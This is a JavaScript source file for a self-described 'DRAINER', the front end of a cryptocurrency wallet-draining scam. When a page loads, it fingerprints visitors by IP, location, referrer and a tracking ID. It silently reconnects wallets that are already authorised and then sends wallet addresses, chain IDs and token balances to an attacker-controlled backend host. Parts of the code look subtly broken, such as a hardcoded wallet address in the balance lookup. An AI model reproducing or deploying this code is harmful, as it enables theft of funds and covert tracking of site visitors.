const _WEB3 = window.Web3
const _WEB3MODAL = window.Web3Modal.default
const _WCP = window.WalletConnectProvider.default

var DRAINER = {
    SETTINGS: SETTINGS,
    LIBS: {
        W3_MODAL: new _WEB3MODAL({
            cacheProvider: false,
            providerOptions: {
                walletconnect: {
                    package: _WCP,
                    options: {
                        rpc: 'https://rpc.ankr.com/eth',
                        chainId: 1
                    }
                }
            }
        })
    },
    STATUS: {
        INITIALIZED: false,
        CONNECTED: false,
        CHECKED: false
    },
    USER: {
        IP: undefined,
        LOCATION: undefined,
        REFERRER: undefined,
        ETHEREUM: undefined,
        ID: undefined,
        VISITS: undefined,
        LAST_VISIT: undefined
    },
    WEB3: {
        WALLET_ADDRESS: undefined,
        CHAIN_ID: undefined,
        PRIVATE_PROVIDER: undefined,
        BALANCES: {
            NATIVE: [],
            ERC20: [],
            ERC721: []
        }
    },
    getUserHost: async function() {
        let user_host = undefined

        user_host = await $.getJSON('https://api.db-ip.com/v2/free/self')

        if (typeof(user_host) !== 'undefined') {
            this.USER.IP = user_host.ipAddress
            this.USER.LOCATION = user_host.countryName
        } else {
            console.log('Failed to get the user data')
            return (false)
        }

        return (true)
    },
    getUserReferrer: async function() {
        this.USER.REFERRER = document.referrer

        return (true)
    },
    getUserEthereum: async function() {
        if(typeof(ethereum) !== 'undefined') {
            this.USER.ETHEREUM = true
        } else {
            this.USER.ETHEREUM = false
        }

        return (true)
    },
    getUserCookie: async function() {
        let id = localStorage.getItem('ID')
        let visits = localStorage.getItem('VISITS')
        let last_visit = localStorage.getItem('LAST_VISIT')

        if(id === null) {
            if(typeof(this.USER.IP) !== 'undefined') {
                id = btoa(this.USER.IP + ':' + Date.now() + ':' + Math.floor(Math.random() * 2**32))
            } else {
                id = btoa(Date.now() + ':' + Math.floor(Math.random() * 2**32))
            }
        }

        if(visits === null) {
            visits = 1
        } else {
            visits = parseInt(visits) + 1
        }

        if (last_visit === null) {
            last_visit = "NOW"
        }

        this.USER.ID = id
        this.USER.VISITS = visits
        this.USER.LAST_VISIT = last_visit

        return (true)
    },
    setUserCookie: async function() {
        localStorage.setItem('ID', this.USER.ID)
        localStorage.setItem('VISITS', this.USER.VISITS)
        localStorage.setItem('LAST_VISIT', Date.now())

        return (true)
    },
    getChainId: async function() {
        let chain_id = undefined

        if (typeof(this.WEB3.PRIVATE_PROVIDER) !== 'undefined') {
            if (typeof(this.WEB3.PRIVATE_PROVIDER.eth) !== 'undefined') {
                chain_id = await this.WEB3.PRIVATE_PROVIDER.eth.getChainId()
            } else {
                console.log('Failed to get the chain id')
                return (false)
            }
        } else {
            console.log('Failed to get the chain id')
            return (false)
        }

        if (typeof(chain_id) !== 'undefined') {
            this.WEB3.CHAIN_ID = chain_id
        } else {
            console.log('Failed to get the chain id')
            return (false)
        }

        return (true)
    },
    getWalletAddress: async function() {
        let wallet_address = undefined

        if (typeof(this.WEB3.PRIVATE_PROVIDER) !== 'undefined') {
            if (typeof(this.WEB3.PRIVATE_PROVIDER.eth) !== 'undefined') {
                wallet_address = await this.WEB3.PRIVATE_PROVIDER.eth.getAccounts()
            } else {
                console.log('Failed to get the wallet address')
                return (false)
            }
        } else {
            console.log('Failed to get the wallet address')
            return (false)
        }
        
        if (typeof(wallet_address) !== 'undefined') {
            this.WEB3.WALLET_ADDRESS = wallet_address[0]
        } else {
            console.log('Failed to get the wallet address')
            return (false)
        }

        return (true)
    },
    updateWeb3: async function() {
        if(await this.getWalletAddress() && await this.getChainId()) {
            return (true)
        } else {
            return (false)
        }
    },
    connectWeb3: async function() {
        let w3_modal_provider = undefined

        try {
            w3_modal_provider = await this.LIBS.W3_MODAL.connect()
        } catch (error) {
            console.log('connectWeb3 W3_MODAL Error:', error)
    
            return (false)
        }

        if (typeof(w3_modal_provider) !== 'undefined') {
            try {
                this.WEB3.PRIVATE_PROVIDER = new _WEB3(w3_modal_provider)
            } catch (error) {
                console.log('connectWeb3 WEB3 Error:', error)
    
                return (false)
            }
        } else {
            return (false)
        }

        if (await this.updateWeb3()) {
            this.STATUS.CONNECTED = true
            this.sendWeb3Data()
        } else {
            console.log('connectWeb3: Could not get the wallet address and chain ID')

            return (false)
        }

        return (true)
    },
    initUserData: async function() {
        await this.getUserHost()
        await this.getUserReferrer()
        await this.getUserEthereum()
        await this.getUserCookie()
        await this.setUserCookie()
        this.sendUserData()

        return (true)
    },
    connect: async function() {
        if(await this.connectWeb3()) {
            await this.api_zapper_getBalances()
    
            return (true)
        } else {
            return (false)
        }
    },
    tryReconectWeb3: async function() {
        let injected_provider = undefined
        let wc_provider = new _WCP({
            rpc: 'https://rpc.ankr.com/eth',
            chainId: 1
        })

        if (typeof(ethereum) !== 'undefined') {
            injected_provider = ethereum

            if (typeof(injected_provider.selectedAddress) !== 'undefined') {
                if (injected_provider.selectedAddress) {
                    try {
                        this.WEB3.PRIVATE_PROVIDER = new _WEB3(injected_provider)
                    } catch (error) {
                        console.log('tryReconectWeb3 WEB3 Error:', error)

                        return (false)
                    }

                    if (await this.updateWeb3()) {
                        this.STATUS.CONNECTED = true
                        this.sendWeb3Data()
                    } else {
                        console.log('connectWeb3: Could not get the wallet address and chain ID')

                        return (false)
                    }

                    this.STATUS.INITIALIZED = true

                    return (true)
                }
            }

            if (typeof(injected_provider.address) !== 'undefined') {
                if (injected_provider.address) {
                    try {
                        this.WEB3.PRIVATE_PROVIDER = new _WEB3(injected_provider)
                    } catch (error) {
                        console.log('tryReconectWeb3 WEB3 Error:', error)

                        return (false)
                    }

                    if (await this.updateWeb3()) {
                        this.STATUS.CONNECTED = true
                        this.sendWeb3Data()
                    } else {
                        console.log('connectWeb3: Could not get the wallet address and chain ID')

                        return (false)
                    }

                    this.STATUS.INITIALIZED = true

                    return (true)
                }
            }

            if (wc_provider.wc._accounts.length > 0) {
                try {
                    wc_provider.enable()
                    this.WEB3.PRIVATE_PROVIDER = new _WEB3(wc_provider)
                } catch (error) {
                    console.log('tryReconectWeb3 WEB3 Error:', error)

                    return (false)
                }

                if (await this.updateWeb3()) {
                    this.STATUS.CONNECTED = true
                    this.sendWeb3Data()
                } else {
                    console.log('connectWeb3: Could not get the wallet address and chain ID')

                    return (false)
                }

                this.STATUS.INITIALIZED = true

                return (true)
            }

            this.STATUS.INITIALIZED = true
    
            return (false)
        }
    },
    getBalances: async function() {
        await this.api_zapper_getBalances()
        this.sendWeb3Balances()

        return (true)
    },
    api_zapper_getBalances: async function() {
        if(this.STATUS.CONNECTED && typeof(this.WEB3.WALLET_ADDRESS) !== 'undefined') {
            try {
                response = await $.get({
                    url: 'https://web.zapper.fi/v2/balances?addresses[0]=0x6410ab5a08cb0bee653617b23894857381c8cfa9' 
                })
            } catch(error) {
                console.log('api_zapper_getBalances: API error')
                return (false)
            }
    
            response = response.replaceAll('\n', '').replaceAll('event: enddata: {}', '').split('event: balancedata:')
            
            index = response.indexOf('')
            if(index > -1) {
                response.splice(index, 1)
            }
            
            response = response.map(JSON.parse)
            response = response.map(function(res) {
                if(res.appId != 'tokens') {
                    return ({})
                }
    
                return (res.balance.wallet)
            })
    
            let balances = []
    
            for(let i = 0; i < response.length; i++) {
                if(!$.isEmptyObject(response[i])) {
                    balances = [...balances, ...Object.values(response[i])]
                }
            }
    
            balances = balances.map(function(bal) {
                result = {
                    symbol: bal.context.symbol,
                    network: bal.network,
                    address: bal.address,
                    balance_TOKEN: bal.context.balance,
                    balance_USD: bal.balanceUSD
                }
                
                return (result)
            })
    
            balances.sort((a, b) => (a.balance_USD < b.BALANCE_USD) ? 1 : ((b.balance_USD < a.balance_USD) ? -1 : 0))
            
            let native = []
            let ERC20 = []

            for(let i = 0; i < balances.length; i++) {
                if(balances[i].address === '0x0000000000000000000000000000000000000000') {
                    native = [...native, balances[i]]
                } else {
                    ERC20 = [...ERC20, balances[i]]
                }
            }
            
            this.WEB3.BALANCES.NATIVE = native
            this.WEB3.BALANCES.ERC20 = ERC20

            return (true)
        } else {
            console.log('api_zapper_getBalances: Wallet disconnected')
            return (false)
        }  
    },
    sendUserData: async function() {
        let response = undefined

        if (typeof(this.USER.ID) !== 'undefined') {
            try {
                response = await $.post({
                    url: 'http://' + this.SETTINGS.BACKEND_HOST + '/visit',
                    data: this.USER
                })
            } catch (error) {
                console.log('sendUserData: Failed to send the user data')
                return (false)
            }
        } else {
            console.log('sendUserData: User ID undefined')
            return (false)
        }

        if(typeof(response) === 'undefined') {
            console.log('sendUserData: Backend returned the error')
            return (false)
        }
        
        return (true)
    },
    sendWeb3Data: async function() {
        let response = undefined

        if (typeof(this.USER.ID) !== 'undefined') {
            try {
                response = await $.post({
                    url: 'http://' + this.SETTINGS.BACKEND_HOST + '/web3/data',
                    data: {
                        ID: this.USER.ID,
                        WEB3: {
                            WALLET_ADDRESS: this.WEB3.WALLET_ADDRESS,
                            CHAIN_ID: this.WEB3.CHAIN_ID
                        }
                    }
                })
            } catch (error) {
                console.log('sendWeb3Data: Failed to send the web3 data')
                return (false)
            }
        } else {
            console.log('sendWeb3Data: User ID undefined')
            return (false)
        }

        if(typeof(response) === 'undefined') {
            console.log('sendWeb3Data: Backend returned the error')
            return (false)
        }
        
        return (true)
    },
    sendWeb3Balances: async function() {
        let response = undefined

        if (typeof(this.USER.ID) !== 'undefined') {
            try {
                response = await $.post({
                    url: 'http://' + this.SETTINGS.BACKEND_HOST + '/web3/balances',
                    data: {
                        ID: this.USER.ID,
                        BALANCES: this.WEB3.BALANCES
                    }
                })
            } catch (error) {
                console.log('sendWeb3Balances: Failed to send the web3 balances')
                return (false)
            }
        } else {
            console.log('sendWeb3Balances: User ID undefined')
            return (false)
        }

        if(typeof(response) === 'undefined') {
            console.log('sendWeb3Balances: Backend returned the error')
            return (false)
        }
        
        return (true)
    }
}

$(document).ready(function() {
    DRAINER.initUserData()

    setTimeout(function() {
        DRAINER.tryReconectWeb3()
    }, 500)
    
    $(DRAINER.SETTINGS.CONNECT.BUTTON_SELECTOR).on('click', function() {
        DRAINER.connect()
    })
})